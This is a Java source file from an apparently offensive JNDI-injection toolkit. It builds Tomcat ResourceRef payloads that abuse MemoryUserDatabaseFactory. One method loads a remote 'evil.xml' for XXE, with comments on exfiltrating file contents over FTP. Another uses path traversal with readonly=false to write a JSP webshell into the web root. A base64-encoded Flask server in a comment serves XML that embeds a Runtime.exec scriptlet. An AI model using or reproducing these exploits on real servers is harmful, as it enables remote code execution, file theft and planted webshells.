package sonomon.jndi.factory;

import javax.naming.StringRefAddr;

import org.apache.naming.ResourceRef;

public class UserDatabaseFactory {
	//tomcat-catalina-8.5.57.jar
	static String factory = "org.apache.catalina.users.MemoryUserDatabaseFactory";
	//XXE,可ftp带出文件内容,无法带出比如尖括号等特殊字符,<7u141/8u162无法带出换行
	public static ResourceRef xxebypass(String url){
		//url = "http://127.0.0.1:81/evil.xml";
	    ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "", true, factory, null);
	    ref.add(new StringRefAddr("pathname", url));
		return ref;
	}
	//写webshell,建议公网flask参考如下base64.linux系统由于无法穿越不存在的目录，需要用其他链新建http:和127.0.0.1:5000目录
	//ZnJvbSBmbGFzayBpbXBvcnQgRmxhc2ssIHJlcXVlc3QKYXBwPUZsYXNrKF9fbmFtZV9fKQoKQGFwcC5yb3V0ZSgnLzxwYXRoOnBhdGg+JywgbWV0aG9kcz1bIkdFVCIsICJQT1NUIl0pCmRlZiB1c2VyZmlsZWJ5cGFzcyhwYXRoKToKCXJldHVybiAnJyc8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCI/Pgo8dG9tY2F0LXVzZXJzIHhtbG5zPSJodHRwOi8vdG9tY2F0LmFwYWNoZS5vcmcveG1sIgogICAgICAgICAgICAgIHhtbG5zOnhzaT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEtaW5zdGFuY2UiCiAgICAgICAgICAgICAgeHNpOnNjaGVtYUxvY2F0aW9uPSJodHRwOi8vdG9tY2F0LmFwYWNoZS5vcmcveG1sIHRvbWNhdC11c2Vycy54c2QiCiAgICAgICAgICAgICAgdmVyc2lvbj0iMS4wIj4KICA8cm9sZSByb2xlbmFtZT0iJiN4M2M7JVJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoJiN4MjI7Y2FsYyYjeDIyOyk7ICUmI3gzZTsiLz4KPC90b21jYXQtdXNlcnM+JycnCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CglhcHAucnVuKGRlYnVnPVRydWUp
	public static ResourceRef filebypass(String url){
		//url = "http://127.0.0.1:5000/../../webapps/ROOT/test.jsp";
	    ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "", true, factory, null);
	    ref.add(new StringRefAddr("pathname", url));
	    ref.add(new StringRefAddr("readonly", "false"));
		return ref;
	}
}
